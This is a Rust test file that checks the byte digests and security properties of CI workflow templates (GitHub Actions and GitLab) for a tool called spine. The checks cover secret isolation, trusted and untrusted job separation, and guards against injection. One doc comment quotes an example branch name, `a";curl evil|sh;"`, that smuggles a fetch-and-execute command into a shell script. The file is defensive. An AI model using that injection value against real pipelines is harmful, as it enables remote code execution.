//! `ci.md` §7.2, §7.3, §8.2, §8.3 and §8.4 — the five provider definitions
//! `spine init` renders, reproduced.
//!
//! These are `spine-owned` bytes on the protected floor (PB §7.3), recorded in
//! the manifest by blob, and checked by G16 against the release's template
//! version. So they are shipped bytes and the digests below move only when a
//! line of the corpus's printed block moves.
//!
//! Every byte count and digest here was computed from the vector files with
//! `wc -c`, `git hash-object` and `shasum -a 256`; none is transcribed from the
//! corpus, which publishes none for these five blocks.
//!
//! The digests are over the **unrendered** template bytes. Two of the five
//! still carry `PIN_` tokens at that point and all five carry the literal
//! `main`, so a rendered file has different bytes and a different id — the same
//! relationship §5.3 states for `ci.sh` and `@@DIST_BASE@@`.

use spine_canon::ObjectFormat;
use spine_template::ci_templates::{
    CI_GITHUB_COLLECT, CI_GITHUB_LAND, CI_GITLAB_ROOT, CI_GITLAB_TRUSTED, CI_GITLAB_UNTRUSTED,
};

/// `(name, bytes, lines, git blob sha1, sha256)`.
///
/// `lines` is the count of `0x0A` bytes, which for these files — each ending in
/// exactly one — is also the line count.
const PUBLISHED: [(&str, &str, usize, usize, &str, &str); 5] = [
    (
        "ci.md §7.2 .github/workflows/spine-collect.yml",
        CI_GITHUB_COLLECT,
        3424,
        95,
        "679793f61f3045d66b0abe0ae1455300d922c7c5",
        "4ff0d82f1e5283e6391b9a6a669eaab13434afcad50b93e31ec19cdcb2097d1a",
    ),
    (
        "ci.md §7.3 .github/workflows/spine-land.yml",
        CI_GITHUB_LAND,
        5078,
        143,
        "9be4d4fca5faeabe5ca2e07a7145ebf60a23b4ca",
        "fd46a0b3f2f4ea09488667645566ad2ce4764bbb1789e6a04e8397c19f7a511e",
    ),
    (
        "ci.md §8.2 .gitlab-ci.yml",
        CI_GITLAB_ROOT,
        312,
        11,
        "c0fd8e5845e2640de95b139c73943802a449d128",
        "ef8998ddecc261546e6c5674e07ac549c61563531e3a8de1671832a53bccf01d",
    ),
    (
        "ci.md §8.3 .spine/gitlab/untrusted.yml",
        CI_GITLAB_UNTRUSTED,
        1147,
        33,
        "b6427ba82db32bb332f4a75a2f460bc99e56e6c4",
        "ee081c3ee39cdac5ae47ac02383400b2140e01a643a6993bd89899af459486f9",
    ),
    (
        "ci.md §8.4 .spine/gitlab/trusted.yml",
        CI_GITLAB_TRUSTED,
        3261,
        79,
        "022a1da22210ca746fc8d5bc4b92b9c593674e1d",
        "6e2e175334947e3d23dd797d06983803db70406b61ced9af714f34eb55cfb75d",
    ),
];

#[test]
fn every_definition_reproduces_its_byte_count_and_both_digests() {
    for (name, body, bytes, lines, blob, sha256) in PUBLISHED {
        let raw = body.as_bytes();
        assert_eq!(raw.len(), bytes, "{name}: byte count");
        assert_eq!(
            raw.iter().filter(|b| **b == b'\n').count(),
            lines,
            "{name}: line count"
        );
        assert_eq!(
            spine_canon::git_blob_id(raw, ObjectFormat::Sha1),
            blob,
            "{name}: git blob id"
        );
        assert_eq!(spine_canon::sha256_hex(raw), sha256, "{name}: sha256");
    }
}

/// `.gitattributes` pins `.spine/** text eol=lf` and `.github/workflows/**` is
/// on the floor, so a CR in any of these forks the blob G16 compares against
/// the manifest's (MF §4.4's `keyring-cr` is the same failure on the adjacent
/// artifact).
#[test]
fn framing_is_lf_only_utf8_with_one_final_newline() {
    for (name, body, ..) in PUBLISHED {
        assert!(!body.contains('\r'), "{name}: a CR would fork the blob");
        assert!(body.ends_with('\n'), "{name}: a final newline");
        assert!(!body.ends_with("\n\n"), "{name}: exactly one");
    }
}

/// The lines of every `run: |` block, by indentation.
///
/// GitHub substitutes `${{ }}` into the script **text** before the shell sees
/// it, so what is inside a `run:` block and what is outside one are two
/// different trust classes — which is why this has to be a structural walk and
/// not a substring search.
fn run_block_lines(yaml: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut base: Option<usize> = None;
    for line in yaml.lines() {
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        if let Some(open_at) = base {
            if line.trim().is_empty() || indent > open_at {
                out.push(line);
                continue;
            }
            base = None;
        }
        if trimmed == "run: |" {
            base = Some(indent);
        }
    }
    out
}

/// §7.2's first load-bearing detail, and §14 R20: "No candidate-controlled
/// value is interpolated into a `run:` script. Every `${{ }}` that carries a
/// branch name, a repository name or a step output crosses into shell as an
/// `env:` binding … a branch named `` a";curl evil|sh;" `` in a `run:` block is
/// code. The candidate names its own branch."
#[test]
fn no_candidate_controlled_value_is_interpolated_into_a_run_script() {
    const CANDIDATE_CONTROLLED: [&str; 3] = [
        "github.event.pull_request.head.ref",
        "github.event.pull_request.head.repo.full_name",
        "github.event.workflow_run.head_branch",
    ];
    for (name, body) in [
        ("spine-collect.yml", CI_GITHUB_COLLECT),
        ("spine-land.yml", CI_GITHUB_LAND),
    ] {
        let scripts = run_block_lines(body);
        assert!(!scripts.is_empty(), "{name}: found no run block to check");
        for expr in CANDIDATE_CONTROLLED {
            assert!(
                !scripts.iter().any(|l| l.contains(expr)),
                "{name}: {expr} reaches a run: script as text"
            );
        }
        // The one expression that legitimately appears inside a script is the
        // provider's own server URL, which no candidate can set.
        for line in &scripts {
            if let Some(rest) = line.split_once("${{") {
                assert!(
                    rest.1.trim_start().starts_with("github.server_url"),
                    "{name}: unexpected interpolation in a script: {}",
                    line.trim()
                );
            }
        }
    }
    // And the two candidate-named values arrive as `env:` bindings instead.
    assert!(CI_GITHUB_COLLECT
        .contains("SPINE_CANDIDATE: ${{ github.event.pull_request.head.ref }}"));
    assert!(CI_GITHUB_COLLECT
        .contains("SPINE_HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}"));
    assert!(
        CI_GITHUB_LAND.contains("SPINE_CANDIDATE: ${{ github.event.workflow_run.head_branch }}")
    );
}

/// U3: "`permissions: contents: read`, or the provider's equivalent, and **no
/// secret**." The collector's whole security argument is that it is the job a
/// candidate's code runs in.
#[test]
fn the_untrusted_workflow_holds_no_secret_and_is_bounded_to_read() {
    assert!(CI_GITHUB_COLLECT.contains("permissions:\n  contents: read\n"));
    assert!(
        !CI_GITHUB_COLLECT.contains("secrets."),
        "U3: the untrusted job carries no secret"
    );
    // The trusted job is where the two secrets live, and they are the two
    // §4 marks trusted-only.
    assert!(CI_GITHUB_LAND.contains("SPINE_PIPELINE_KEY: ${{ secrets.SPINE_PIPELINE_KEY }}"));
    assert!(CI_GITHUB_LAND.contains("SPINE_PUSH_TOKEN: ${{ secrets.SPINE_PUSH_TOKEN }}"));
    // `SPINE_TRUST_ROOT` is a variable in both, never a secret: `spine check
    // --ci` refuses without one and `--collect` runs under `--ci` (§7.4, D13).
    for body in [CI_GITHUB_COLLECT, CI_GITHUB_LAND] {
        assert!(body.contains("SPINE_TRUST_ROOT: ${{ vars.SPINE_TRUST_ROOT }}"));
    }
}

/// U4 and T4: both jobs execute `.spine/ci.sh` **read from `origin/<trunk>`**,
/// never the checkout's copy. On every provider, and it is the same command.
#[test]
fn every_definition_reads_ci_sh_from_origin_trunk() {
    for (name, body, trunk_var) in [
        ("spine-collect.yml", CI_GITHUB_COLLECT, "$SPINE_TRUNK"),
        ("spine-land.yml", CI_GITHUB_LAND, "$SPINE_TRUNK"),
        (
            "gitlab/untrusted.yml",
            CI_GITLAB_UNTRUSTED,
            "$SPINE_TRUNK",
        ),
        ("gitlab/trusted.yml", CI_GITLAB_TRUSTED, "$SPINE_TRUNK"),
    ] {
        assert!(
            body.contains(&format!(
                "git show \"origin/{trunk_var}:.spine/ci.sh\" >\"$d/ci.sh\""
            )),
            "{name}: must read ci.sh from trunk"
        );
    }
}

/// U6: the result file is the untrusted job's **only** artifact, handed over
/// "even when the collector exited non-zero" — a red suite must reach G1 as
/// evidence rather than vanish as a failed job (§7.2's third detail).
#[test]
fn the_result_upload_is_always_and_the_verdict_is_reported_later() {
    assert!(CI_GITHUB_COLLECT.contains("if: always() && steps.collect.outputs.rc != ''"));
    assert!(CI_GITHUB_COLLECT.contains("if-no-files-found: error"));
    // The failing exit is deferred to a step after the upload.
    let upload = CI_GITHUB_COLLECT.find("upload-artifact").unwrap();
    let verdict = CI_GITHUB_COLLECT
        .find("Report the collector's own verdict")
        .unwrap();
    assert!(upload < verdict, "the upload must precede the failure");
    // GitLab needs no staging copy: `when: always` plus the project-relative
    // zip preserves §6.3's path for free (§8.3).
    assert!(CI_GITLAB_UNTRUSTED.contains("when: always"));
    assert!(CI_GITLAB_UNTRUSTED.contains("- \".spine/cache/results/\""));
}

/// §7.2's second detail: the handoff is staged into `$RUNNER_TEMP/spine-handoff`
/// because "`actions/upload-artifact` roots the artifact at the least common
/// ancestor of what it matches, and some of its versions exclude dot-prefixed
/// path segments by default — `.spine` is one". The staging removes the
/// dependency on which version the release pins.
#[test]
fn the_github_handoff_is_staged_outside_a_dot_prefixed_directory() {
    assert!(CI_GITHUB_COLLECT.contains("h=\"$RUNNER_TEMP/spine-handoff\""));
    assert!(CI_GITHUB_COLLECT.contains("path: ${{ runner.temp }}/spine-handoff"));
    assert!(
        !CI_GITHUB_COLLECT.contains("path: .spine/cache/results"),
        "uploading from the dot-prefixed path is what the staging avoids"
    );
    // §6.3 step 3 restores the exact path on the other side.
    assert!(CI_GITHUB_LAND.contains("path: .spine/cache/results"));
}

/// §7.3's first detail: "The `if:` guard is not defence in depth; two of its
/// three clauses are the guarantee." A candidate may add a workflow of its own
/// named `spine-collect` on `push`; its completion reaches this workflow, and
/// only the `event` and `path` clauses refuse it. §14 R11.
#[test]
fn the_lander_guards_workflow_run_with_three_facts_a_candidate_cannot_forge() {
    for clause in [
        "github.event.workflow_run.event == 'pull_request_target'",
        "github.event.workflow_run.path == '.github/workflows/spine-collect.yml'",
        "github.event.workflow_run.head_repository.full_name == github.repository",
    ] {
        assert!(CI_GITHUB_LAND.contains(clause), "missing guard: {clause}");
    }
    // T1/T2: a trunk-scoped event and an environment whose deployment-branch
    // rule is trunk only (§7.4).
    assert!(CI_GITHUB_LAND.contains("environment: spine-trusted"));
    assert!(CI_GITHUB_LAND.contains("concurrency:\n  group: spine-land\n  cancel-in-progress: false"));
}

/// T7 and §7.3's third detail: "the bypass principal of configuration (a) is a
/// deploy key or app installation only the trusted job holds, never the Actions
/// token both jobs share." `github.token` appears only where it must —
/// downloading the sibling run's artifact and re-queueing — never as the push
/// credential.
#[test]
fn the_push_credential_is_never_the_shared_actions_token() {
    assert!(CI_GITHUB_LAND.contains("printf 'x-access-token:%s' \"$SPINE_PUSH_TOKEN\""));
    assert!(
        CI_GITHUB_LAND.contains("echo \"::add-mask::$b64\""),
        "the base64 is masked before it is written anywhere"
    );
    assert!(
        CI_GITHUB_LAND.contains("persist-credentials: false"),
        "and the checkout writes no credential of its own to disk"
    );
    // `actions: write`, not `read`: the re-queue of PB §7.4 rule 3 needs it.
    assert!(CI_GITHUB_LAND.contains("permissions:\n  actions: write\n  contents: read\n"));
}

/// §6.4: "**`quick/reseal-*` is tested first because it is a `quick/*` ref.**
/// A router that matches `quick/*` first would land a reseal as an ordinary
/// quick-lane change, which is a different envelope with a different
/// `Spine-Event` and a different review rule." Both landers, and §6.4 says the
/// order is normative.
///
/// The search starts at the routing block, not at byte 0: both files also carry
/// an earlier `intent/*|quick/*|spine/upgrade-*)` guard that only *admits* a
/// candidate ref, and a first-occurrence search would score that guard's
/// alternation instead of the router's arms.
#[test]
fn quick_reseal_is_routed_before_quick_in_both_landers() {
    for (name, body) in [
        ("spine-land.yml", CI_GITHUB_LAND),
        ("gitlab/trusted.yml", CI_GITLAB_TRUSTED),
    ] {
        let router = &body[body
            .find("quick/reseal-*)")
            .unwrap_or_else(|| panic!("{name}: no router"))..];
        let arm = |pattern: &str| {
            router
                .find(pattern)
                .unwrap_or_else(|| panic!("{name}: no {pattern} arm"))
        };
        let reseal = arm("quick/reseal-*)");
        let intent = arm("intent/*)");
        let quick = arm("quick/*)");
        let upgrade = arm("spine/upgrade-*)");
        assert_eq!(reseal, 0, "{name}: the router opens on the reseal arm");
        assert!(intent < quick, "{name}: intent before quick");
        assert!(quick < upgrade, "{name}: quick before upgrade");
        assert!(
            body.contains("--land --reseal") && body.contains("--land --quick"),
            "{name}: both quick-lane invocations"
        );
        // "anything else | refuse, exit 3".
        assert!(body.contains("exit 3"), "{name}: the unroutable exit");
    }
}

/// §8.1: on GitLab "the trusted job's definition does come from trunk,
/// structurally", and §8.2's root file is what makes that so — it includes both
/// job files at `ref: 'main'`, the trunk name §3.3 substitutes.
#[test]
fn the_gitlab_root_includes_both_job_files_at_trunk() {
    assert!(CI_GITLAB_ROOT.contains("- project: '$CI_PROJECT_PATH'"));
    assert!(CI_GITLAB_ROOT.contains("ref: 'main'"));
    assert!(CI_GITLAB_ROOT.contains("- '/.spine/gitlab/untrusted.yml'"));
    assert!(CI_GITLAB_ROOT.contains("- '/.spine/gitlab/trusted.yml'"));
    // One stage, and both jobs declare it.
    assert!(CI_GITLAB_ROOT.contains("stages:\n  - spine\n"));
    for body in [CI_GITLAB_UNTRUSTED, CI_GITLAB_TRUSTED] {
        assert!(body.contains("stage: spine"));
    }
}

/// U2 on GitLab: the collector is the only job that runs on the three candidate
/// prefixes, and it runs on nothing else — the `- when: never` fallthrough is
/// what makes the rule list closed.
#[test]
fn the_gitlab_collector_runs_only_on_merge_requests_for_candidate_refs() {
    assert!(CI_GITLAB_UNTRUSTED.contains("$CI_PIPELINE_SOURCE == \"merge_request_event\""));
    assert!(CI_GITLAB_UNTRUSTED
        .contains("$CI_COMMIT_REF_NAME =~ /^(intent\\/|quick\\/|spine\\/upgrade-)/"));
    assert!(CI_GITLAB_UNTRUSTED.contains("- when: never"));
    assert!(CI_GITLAB_UNTRUSTED.contains("interruptible: true"));
}

/// T1 on GitLab: a scheduled pipeline on trunk and nothing else.
/// `interruptible: false` "is not decoration: a landing interrupted between the
/// CAS and the note push is exit 5's case with nobody to see it" (§8.4).
#[test]
fn the_gitlab_lander_runs_only_on_a_schedule_on_trunk_and_is_uninterruptible() {
    assert!(CI_GITLAB_TRUSTED
        .contains("$CI_PIPELINE_SOURCE == \"schedule\" && $CI_COMMIT_REF_NAME == \"main\""));
    assert!(CI_GITLAB_TRUSTED.contains("- when: never"));
    assert!(CI_GITLAB_TRUSTED.contains("interruptible: false"));
    assert!(
        CI_GITLAB_TRUSTED.contains("resource_group: spine-land"),
        "which serialises trusted runs the way GitHub's concurrency group does"
    );
}

/// §8.4's discovery, step 2: "Sort the candidate ref names **ascending by
/// bytes**. This is an ordering, not a priority." `LC_ALL=C` is what makes it
/// bytes rather than a locale's collation, and two runners in two locales must
/// discover the same candidate.
#[test]
fn gitlab_candidate_discovery_sorts_ascending_by_bytes() {
    assert!(CI_GITLAB_TRUSTED.contains("| LC_ALL=C sort"));
    assert!(CI_GITLAB_TRUSTED.contains("refs/heads/intent refs/heads/quick refs/heads/spine"));
    // Step 3: an MR-sourced pipeline at that ref's tip, with a `spine-collect`
    // job in it. A stale artifact is caught by `tree=`, not by discovery.
    assert!(CI_GITLAB_TRUSTED.contains("source=merge_request_event"));
    assert!(CI_GITLAB_TRUSTED.contains("select(.name==\"spine-collect\")"));
}

/// §6.3 step 3, rendered twice: the trusted stage materializes the file at
/// `.spine/cache/results/` and then checks the tree holds exactly one entry,
/// that it is a regular file and not a symlink, and that it ends `.jsonl`.
/// "The YAML checks shape; `spine check` checks identity."
#[test]
fn both_landers_check_the_handoffs_shape_and_never_its_identity() {
    for (name, body) in [
        ("spine-land.yml", CI_GITHUB_LAND),
        ("gitlab/trusted.yml", CI_GITLAB_TRUSTED),
    ] {
        assert!(
            body.contains("find .spine/cache/results -mindepth 1 | wc -l | tr -d ' '"),
            "{name}: the one-entry check"
        );
        assert!(body.contains("-L \"$f\""), "{name}: the symlink refusal");
        assert!(body.contains("*.jsonl)"), "{name}: the suffix check");
        assert!(
            !body.contains("tree="),
            "{name}: identity is spine's, never the definition's"
        );
    }
}

/// T9 and §6.5: the canonical report bytes are kept as an artifact of the
/// trusted run, `if: always()`. "Without them no candidate report can ever be
/// assembled again — a lost note is a landing whose judgement is permanently
/// unverifiable by anyone" (GR §4.4.4).
#[test]
fn both_landers_keep_the_gate_report_whatever_the_landing_did() {
    assert!(CI_GITHUB_LAND.contains("name: spine-report"));
    assert!(CI_GITHUB_LAND.contains("path: .spine/cache/report.json"));
    assert!(CI_GITHUB_LAND.contains("if: always() && steps.land.outputs.rc != ''"));
    assert!(CI_GITHUB_LAND.contains("retention-days: 90"));
    assert!(CI_GITLAB_TRUSTED.contains("expire_in: 90 days"));
    assert!(CI_GITLAB_TRUSTED.contains("- \".spine/cache/report.json\""));
}

/// §6.6 exit 2 is `base-moved`, and only GitHub needs a re-queue step:
/// "**`base-moved` needs no re-queue step on GitLab**: the next scheduled
/// pipeline rediscovers the candidate against the new tip" (§8.4).
#[test]
fn only_the_chained_lander_re_queues_on_base_moved() {
    assert!(CI_GITHUB_LAND.contains("if: steps.land.outputs.rc == '2'"));
    assert!(CI_GITHUB_LAND.contains("actions/runs/${SPINE_RUN_ID}/rerun"));
    assert!(
        !CI_GITLAB_TRUSTED.contains("rerun"),
        "the schedule rediscovers; it does not re-queue"
    );
}

/// U8: "This job therefore adds **no** restore, install or setup step of its
/// own" — a restore step here "would execute candidate-authored lifecycle
/// scripts before rule 0's key-visibility probe had run". Dependency restore is
/// a phase of the collector, running trunk's `.spine/restore.sh`.
#[test]
fn no_untrusted_definition_restores_installs_or_sets_up_anything() {
    for (name, body) in [
        ("spine-collect.yml", CI_GITHUB_COLLECT),
        ("gitlab/untrusted.yml", CI_GITLAB_UNTRUSTED),
    ] {
        for forbidden in [
            "actions/setup-",
            "npm ci",
            "npm install",
            "pip install",
            "restore.sh",
            "cache@",
        ] {
            assert!(
                !body.contains(forbidden),
                "{name}: {forbidden} runs repository code before the probe"
            );
        }
    }
    // And `.spine/restore.sh` is named by no definition at all (§3.1).
    for (_, body, ..) in PUBLISHED {
        assert!(!body.contains("restore.sh"));
    }
}
